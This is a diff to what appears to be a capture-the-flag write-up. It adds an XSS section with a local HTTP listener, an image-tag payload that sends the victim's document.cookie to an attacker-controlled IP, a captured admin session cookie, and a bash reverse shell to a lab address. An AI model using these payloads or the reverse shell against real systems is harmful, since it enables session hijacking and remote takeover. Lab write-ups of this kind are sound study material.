@@ -112,16 +112,19 @@
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/12cd84a3-b7ec-47cb-bea8-793b063db8ee)
 
+## XSS
+
     python3 -m http.server 80
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/3bbe5026-5eaa-4c1e-a447-4093f7ed8fa7)
 
     <img src=x onerror=fetch('http://IP-ADDRESS/'+document.cookie);>
 
-![image](https://github.com/zer00d4y/writeups/assets/128820441/50786230-f4ed-4b7e-b867-d4294a8e6bd1)
+![image](https://github.com/zer00d4y/writeups/assets/128820441/3775aa35-df03-4ba7-97e4-4140a1b6429d)
+
+Admin cookie: `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/2f46367e-f8c0-41e3-aacd-eae73d703a10)
-
 
         #!/bin/bash
         /bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.91/6565 0>&1'
